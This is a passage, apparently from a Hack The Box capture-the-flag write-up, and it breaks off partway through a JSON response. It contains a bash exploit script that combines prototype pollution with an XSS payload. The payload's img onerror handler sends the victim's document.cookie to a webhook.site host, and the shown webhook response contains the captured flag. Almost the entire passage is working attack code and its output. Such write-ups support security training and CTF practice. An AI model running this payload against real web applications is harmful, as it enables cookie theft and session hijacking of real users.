

bash
# Set up variables
TARGET="http://<docker-instance>"
WEBHOOK="https://webhook.site/" # or interact.sh

# URL encode the XSS payload
PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('<img src=x onerror=location=\"${WEBHOOK}?\"+document.cookie>'))")

# Send the exploit
curl -X POST "${TARGET}/api/report" \
  -H "Content-Type: application/json" \
  -d "{\"id\": \"1?__proto__.whiteList.img=src,onerror&search=${PAYLOAD}\"}"


### Webhook Response

json
{
  "method": "GET",
  "query": {
    "flag": "HTB{flag}"
  },
  "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/99.0.4844.0 Safari/537.36",
  "referer": "http://127.0.0.1:1337/"